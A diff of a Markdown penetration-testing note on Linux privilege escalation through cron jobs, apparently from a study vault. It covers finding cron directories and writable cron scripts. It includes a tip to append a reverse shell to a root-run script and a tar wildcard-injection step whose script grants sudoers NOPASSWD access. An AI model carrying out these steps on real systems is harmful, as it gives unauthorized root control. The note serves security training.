@@ -3,7 +3,7 @@ id: Scheduled Tasks
 aliases: []
 tags:
   - Linux/Privesc/Scheduled-Tasks
-  - Linux/Privesc/Cron
+  - Linux/Privesc/Cron-Jobs
 ---
 
 # Scheduled Tasks
@@ -17,6 +17,10 @@ Discover Cron directories
 
 ```sh
 ls -al /etc/cron*
+```
+
+```sh
+ls -al /etc/cron.d/
 ```
 
 ```sh
@@ -36,6 +40,10 @@ ls -al /etc/cron.monthly/
 ```
 
 ```sh
+ls -al /var/spool/cron/
+```
+
+```sh
 ls -al /var/spool/cron/crontabs/
 ```
 
@@ -49,25 +57,7 @@ crontab -l
 cat /etc/crontab
 ```
 
-### Pspy
-
-[pspy](https://github.com/DominicBreuker/pspy)
-monitors linux processes
-(*e.g., commands run by other users, cron jobs, etc.*)
-without `root` permissions,
-
-```sh
-./pspy64 -pf -i 1000
-```
-
-<!-- Info {{{-->
-> [!info]-
->
-> - `-p`: Print commands
-> - `-i`: Print filesystem events
-> - `-i 1000`: Scan [procfs](https://en.wikipedia.org/wiki/Procfs)
->    every second
-<!-- }}} -->
+Investigate [[Processes#Running Processes|Running Processes]]
 
 <!-- Example {{{-->
 > [!example]-
@@ -75,6 +65,9 @@ without `root` permissions,
 > - A Cron Job runs `/dmz-backups/backup.sh`
 > - `backup.sh` creates a tarball file of the contents of `/var/www/html`
 >
+> ```sh
+> ./pspy64 -pf -i 1000
+> ```
 > ```sh
 > pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
 >
@@ -126,13 +119,6 @@ without `root` permissions,
 > ```
 <!-- }}} -->
 
-<!-- Tip {{{-->
-> [!tip]-
->
-> Add a [RevShell](https://www.revshells.com/)
-> to the script to spawn a `root` shell
-<!-- }}} -->
-
 ___
 <!-- }}} -->
 
@@ -142,9 +128,9 @@ ___
 <!-- Write Privilege {{{-->
 ### Write Privilege
 
-Check if the following directories have write privilege
+Check if the any of the Cron directories have write privilege
 
-- `/etc/cron.d`
+`/etc/cron.d`
 
 ```sh
 test -w /etc/cron.d && echo "Writable" || echo "Not Writable"
@@ -158,42 +144,75 @@ find /etc/cron.d -type f -perm -0002 -ls
 for g in $(id -Gn); do find /etc/cron.d -type f -perm -0020 -group "$g" -ls; done
 ```
 
-- `/etc/cron.hourly`
+`/etc/cron.hourly`
 
 ```sh
 test -w /etc/cron.hourly && echo "Writable" || echo "Not Writable"
 ```
 
-- `/etc/cron.daily/`
+```sh
+find /etc/cron.hourly -type f -perm -0002 -ls
+```
+
+`/etc/cron.daily/`
 
 ```sh
 test -w /etc/cron.daily && echo "Writable" || echo "Not Writable"
 ```
 
-- `/etc/cron.weekly/`
+```sh
+find /etc/cron.daily -type f -perm -0002 -ls
+```
+
+`/etc/cron.weekly/`
 
 ```sh
 test -w /etc/cron.weekly && echo "Writable" || echo "Not Writable"
 ```
 
-- `/etc/cron.monthly/`
+```sh
+find /etc/cron.weekly -type f -perm -0002 -ls
+```
+
+`/etc/cron.monthly/`
 
 ```sh
 test -w /etc/cron.monthly && echo "Writable" || echo "Not Writable"
 ```
 
-- `/etc/crontab`
+```sh
+find /etc/cron.monthly -type f -perm -0002 -ls
+```
+
+`/etc/crontab`
 
 ```sh
 test -w /etc/crontab && echo "Writable" || echo "Not Writable"
 ```
 
-- `/var/spool/cron/crontabs/root`
+```sh
+find /etc/corontab -type f -perm -0002 -ls
+```
+
+`/var/spool/cron`
+
+```sh
+test -w /var/spool/cron && echo "Writable" || echo "Not Writable"
+```
+
+```sh
+find /var/spool/cron -type f -perm -0002 -ls
+```
+
+`/var/spool/cron/crontabs/root`
 
 ```sh
 test -w /var/spool/cron/crontabs/root && echo "Writable" || echo "Not Writable"
 ```
 
+```sh
+find /var/spool/cron/crontabs/root -type f -perm -0002 -ls
+```
 
 > [!todo]
 >
@@ -203,6 +222,25 @@ test -w /var/spool/cron/crontabs/root && echo "Writable" || echo "Not Writable"
 >
 > Find [[Directory & File#Writeable Directories|Writeable Directories]] &
 > [[Directory & File#Writeable|Writeable Files]]
+
+<!-- }}} -->
+
+<!-- Writable Scripts {{{-->
+### Writable Scripts
+
+Check the [[Directory & File#Writable|writability]]
+of the scripts executed by Cron Jobs
+
+```sh
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+```
+
+<!-- Tip {{{-->
+> [!tip]-
+>
+> Append a [RevShell](https://www.revshells.com/)
+> to the script to spawn a `root` shell
+<!-- }}} -->
 
 <!-- }}} -->
 
@@ -270,7 +308,7 @@ Write out the command names as filenames
 1. `root.sh`: Add the user to sudoers
 
 ```sh
-echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+echo 'echo "<user> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
 ```
 
 2. `--checkpoint=1`: Set tar checkpoint to `1`
